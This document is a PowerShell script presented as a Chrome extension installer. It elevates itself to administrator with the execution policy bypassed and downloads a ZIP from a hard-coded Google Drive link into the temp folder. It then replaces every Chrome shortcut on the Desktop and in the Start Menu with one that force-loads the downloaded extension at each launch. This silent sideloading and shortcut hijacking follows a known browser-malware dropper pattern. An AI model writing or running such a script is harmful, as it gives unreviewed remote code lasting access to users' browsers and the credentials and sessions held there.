If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Relaunch the script as administrator
    $arguments = "-NoProfile -ExecutionPolicy Bypass -File `"" + $MyInvocation.MyCommand.Path + "`""
    Start-Process PowerShell -ArgumentList $arguments -Verb RunAs
    Exit
}

Set-Clipboard -Value "Set-ExecutionPolicy Bypass -Scope Process"


Set-ExecutionPolicy Bypass -Scope Process

# Variables
$extensionUrl = "https://drive.usercontent.google.com/download?id=1L3sKbU8RXWIBUnWs0dys0cQvCbq_EXUu&export=download&authuser=0&confirm=t&uuid=c0201940-04f1-4b1c-8887-07c977acbd9a&at=AENtkXbHTvKsKwlA1KeRNmUM-g15:1732201195375"  # Replace with your extension's download URL
$zipPath = "$env:TEMP\extension.zip"
$extractPath = "$env:TEMP\extension"

# Download the extension ZIP file
Invoke-WebRequest -Uri $extensionUrl -OutFile $zipPath

# Extract the ZIP file
if (Test-Path $extractPath) {
    Remove-Item -Path $extractPath -Recurse -Force
}
Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force

# Define Chrome executable path
$chromePath = "$env:ProgramFiles\Google\Chrome\Application\chrome.exe"
if (-not (Test-Path $chromePath)) {
    $chromePath = "$env:ProgramFiles(x86)\Google\Chrome\Application\chrome.exe"
}

# Check if Chrome is installed
if (-not (Test-Path $chromePath)) {
    Write-Host "Google Chrome is not installed on this machine."
    exit
}

# Define potential locations for shortcuts
$desktopPaths = @(
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\OneDrive\Desktop"
)
$startMenuPaths = @(
    "$env:APPDATA\Microsoft\Windows\Start Menu\Programs",
    "C:\ProgramData\Microsoft\Windows\Start Menu\Programs"
)

# Original Chrome shortcut name
$originalShortcutName = "Google Chrome.lnk"

# Function to create a shortcut
function Create-Shortcut {
    param (
        [string]$shortcutPath
    )
    $wshShell = New-Object -ComObject WScript.Shell
    $shortcut = $wshShell.CreateShortcut($shortcutPath)
    $shortcut.TargetPath = $chromePath
    $shortcut.Arguments = "--load-extension=$extractPath"
    $shortcut.WorkingDirectory = Split-Path -Parent $chromePath
    $shortcut.Save()
}

# Function to replace existing shortcuts
function Replace-Shortcuts {
    param (
        [string[]]$locations
    )
    foreach ($location in $locations) {
        if (Test-Path $location) {
            $shortcuts = Get-ChildItem -Path $location -Filter $originalShortcutName -Recurse -ErrorAction SilentlyContinue
            foreach ($shortcut in $shortcuts) {
                Remove-Item -Path $shortcut.FullName -Force
                Write-Host "Replaced shortcut at $($shortcut.FullName)"
                Create-Shortcut -shortcutPath $shortcut.FullName
            }
        }
    }
}

# Replace shortcuts on Desktop and Start Menu locations
Replace-Shortcuts -locations $desktopPaths
Replace-Shortcuts -locations $startMenuPaths

# Notify the user
Write-Host "Extension installed successfully. All original shortcuts have been replaced."
